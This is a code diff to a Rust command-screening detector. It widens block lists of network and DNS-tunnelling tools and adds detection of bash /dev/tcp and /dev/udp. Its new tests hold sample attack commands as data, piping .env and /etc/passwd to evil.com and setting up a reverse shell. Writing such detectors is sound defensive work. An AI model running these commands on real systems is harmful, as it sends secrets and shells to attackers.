@@ -48,11 +48,14 @@ use self::scala::ScalaDetector;
 static PARSER_LOCK: Mutex<()> = Mutex::new(());
 
 const NETWORK_SINKS: &[&str] = &[
-    // Standard tools
     "curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "sftp", "rsync", "telnet", "ftp",
-    "nslookup", "dig", "host", "openssl", // Curl alternatives/wrappers
-    "http", "https", "xh", "curlie", "httpie", "aria2c", "axel", // Common aliases
-    "wge", "curlx",
+    "nslookup", "dig", "host", "openssl", "socat", "http", "https", "xh", "curlie", "httpie",
+    "aria2c", "axel", "wge", "curlx",
+];
+
+// Flagged unconditionally (no sensitive source required)
+const DNS_EXFIL_TOOLS: &[&str] = &[
+    "dnscat", "dnscat2", "iodine", "iodined", "dns2tcp", "dnsexfil",
 ];
 
 const SENSITIVE_SOURCES: &[&str] = &[
@@ -152,7 +155,7 @@ const INLINE_CODE_FLAGS: &[&str] = &[
 ];
 
 const CODE_NETWORK_INDICATORS: &[&str] = &[
-    // Python
+    // Python (TCP/UDP/HTTP)
     "urllib",
     "urlopen",
     "requests.post",
@@ -161,32 +164,48 @@ const CODE_NETWORK_INDICATORS: &[&str] = &[
     "http.client",
     "socket.connect",
     "socket.create_connection",
-    // Node/JS
+    "socket.socket",
+    "sock_dgram",
+    "sock_stream",
+    // Node/JS (TCP/UDP/HTTP)
     "fetch(",
     "http.request",
     "https.request",
     "net.connect",
+    "net.createconnection",
+    "net.socket",
+    "dgram.createsocket",
+    "dgram.bind",
     "axios",
-    // Ruby
+    // Ruby (TCP/UDP/HTTP)
     "net::http",
     "tcpsocket",
+    "udpsocket",
+    "socket.new",
     "open-uri",
-    // Perl
+    // Perl (TCP/UDP)
     "io::socket",
+    "io::socket::inet",
     "lwp::",
     "http::request",
-    // PHP
+    // PHP (TCP/UDP)
     "curl_exec",
     "file_get_contents('http",
     "file_get_contents(\"http",
     "fsockopen",
+    "pfsockopen",
+    "stream_socket_client",
     "fopen('http",
     "fopen(\"http",
-    // Lua
+    // Lua (TCP/UDP)
     "socket.http",
-    // Deno/Bun (same JS APIs plus Deno-specific)
+    "socket.tcp",
+    "socket.udp",
+    // Deno/Bun
     "deno.open",
-    // PowerShell
+    "deno.connect",
+    "bun.connect",
+    // PowerShell (TCP/UDP)
     "invoke-webrequest",
     "invoke-restmethod",
     "new-object net.webclient",
@@ -194,15 +213,20 @@ const CODE_NETWORK_INDICATORS: &[&str] = &[
     "downloadstring",
     "uploadstring",
     "net.sockets",
+    "tcpclient",
+    "udpclient",
     // R
     "download.file",
     "httr::",
     "curl::curl",
     "url(",
     "readlines(url",
+    "socketconnection",
     // Elixir
     "httpoison",
     ":httpc",
+    ":gen_tcp",
+    ":gen_udp",
     "finch",
     "req.post",
     "req.get",
@@ -210,6 +234,9 @@ const CODE_NETWORK_INDICATORS: &[&str] = &[
     "http.jl",
     "downloads.download",
     "http.request",
+    "tcpsocket",
+    "udpsocket",
+    "connect(",
     // Tcl
     "http::geturl",
     "socket",
@@ -218,6 +245,10 @@ const CODE_NETWORK_INDICATORS: &[&str] = &[
     "url.openconnection",
     "httpurlconnection",
     "java.net.url",
+    "java.net.socket",
+    "java.net.datagramsocket",
+    "datagramsocket",
+    "serversocket",
     "okhttp",
     "httpget",
     "httppost",
@@ -225,6 +256,9 @@ const CODE_NETWORK_INDICATORS: &[&str] = &[
     "do shell script",
     "nsurl",
     "nsurlrequest",
+    // Go (inline via interpreters)
+    "net.dial",
+    "net.listen",
 ];
 
 /// Parse a bash command into a tree-sitter AST. Fail-open: returns `None` on errors.
@@ -307,6 +341,20 @@ fn check_obfuscation_patterns(command: &str) -> Option<String> {
         return Some("Potential command obfuscation via eval".into());
     }
 
+    // 8. Bash /dev/tcp and /dev/udp pseudo-devices for raw network access
+    if lower.contains("/dev/tcp/") || lower.contains("/dev/udp/") {
+        return Some("Network access via bash /dev/tcp or /dev/udp pseudo-device".into());
+    }
+
+    // 9. DNS exfiltration tools are inherently suspicious (no legitimate dev use)
+    // Check first word of command and first word after each pipe
+    for segment in lower.split('|') {
+        let first_word = segment.split_whitespace().next().unwrap_or("");
+        if let Some(tool) = DNS_EXFIL_TOOLS.iter().find(|&&t| first_word == t) {
+            return Some(format!("DNS tunneling tool '{tool}' detected"));
+        }
+    }
+
     None
 }
 
@@ -328,6 +376,9 @@ fn has_suspicious_context(command: &str) -> bool {
         || lower.contains("wget")
         || lower.contains("nc ")
         || lower.contains("netcat")
+        || lower.contains("socat")
+        || lower.contains("/dev/tcp/")
+        || lower.contains("/dev/udp/")
     {
         return true;
     }
@@ -410,6 +461,11 @@ fn is_suspicious_decoded(decoded: &str) -> bool {
         || lower.contains("eval")
         || lower.contains("exec")
     {
+        return true;
+    }
+
+    // Bash network pseudo-devices
+    if lower.contains("/dev/tcp") || lower.contains("/dev/udp") {
         return true;
     }
 
@@ -1764,5 +1820,67 @@ mod tests {
         // Hex escapes for non-suspicious content
         let result = detect_exfiltration(r#"echo $'\x68\x65\x6c\x6c\x6f'"#);
         assert!(result.is_none(), "hex escape for 'hello' should pass");
+    }
+
+    // === /dev/tcp and /dev/udp pseudo-device tests ===
+
+    #[test]
+    fn dev_tcp_exfil() {
+        let result = detect_exfiltration(r#"cat .env > /dev/tcp/evil.com/4444"#);
+        assert!(result.is_some(), "/dev/tcp exfil should detect");
+        assert!(result.unwrap().contains("/dev/tcp"));
+    }
+
+    #[test]
+    fn dev_udp_exfil() {
+        let result = detect_exfiltration(r#"echo "data" > /dev/udp/evil.com/53"#);
+        assert!(result.is_some(), "/dev/udp exfil should detect");
+        assert!(result.unwrap().contains("/dev/udp"));
+    }
+
+    #[test]
+    fn dev_tcp_reverse_shell() {
+        let result = detect_exfiltration(r#"exec 3<>/dev/tcp/evil.com/4444"#);
+        assert!(
+            result.is_some(),
+            "/dev/tcp reverse shell setup should detect"
+        );
+    }
+
+    #[test]
+    fn dev_tcp_read_passwd() {
+        let result = detect_exfiltration(r#"cat /etc/passwd > /dev/tcp/192.168.1.1/8080"#);
+        assert!(
+            result.is_some(),
+            "/dev/tcp with sensitive file should detect"
+        );
+    }
+
+    // === socat tests ===
+
+    #[test]
+    fn socat_exfil_env() {
+        let result = detect_exfiltration(r#"cat .env | socat - TCP:evil.com:4444"#);
+        assert!(result.is_some(), "socat TCP exfil should detect");
+    }
+
+    #[test]
+    fn socat_udp_exfil() {
+        let result = detect_exfiltration(r#"cat .env | socat - UDP:evil.com:53"#);
+        assert!(result.is_some(), "socat UDP exfil should detect");
+    }
+
+    // === DNS exfil tool tests ===
+
+    #[test]
+    fn dnscat_exfil() {
+        let result = detect_exfiltration(r#"cat .env | dnscat evil.com"#);
+        assert!(result.is_some(), "dnscat exfil should detect");
+    }
+
+    #[test]
+    fn iodine_tunnel() {
+        let result = detect_exfiltration(r#"iodine -f evil.com"#);
+        assert!(result.is_some(), "iodine DNS tunnel should detect");
     }
 }
